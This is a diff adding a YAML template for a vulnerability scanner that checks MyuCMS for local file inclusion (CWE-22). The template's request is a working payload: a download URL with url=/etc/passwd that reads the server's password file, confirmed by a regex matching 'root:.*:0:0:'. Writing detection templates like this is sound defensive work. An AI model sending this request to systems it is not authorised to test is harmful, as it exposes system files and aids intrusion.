@@ -1,0 +1,25 @@
+id: "myucms-lfr"
+name: "MyuCMS - Local File Inclusion"
+severity: "high"
+description: "MyuCMS is vulnerable to local file inclusion."
+tech:
+  - "php"
+tags:
+  - "myucms"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://blog.csdn.net/yalecaltech/article/details/104908257"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "or"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
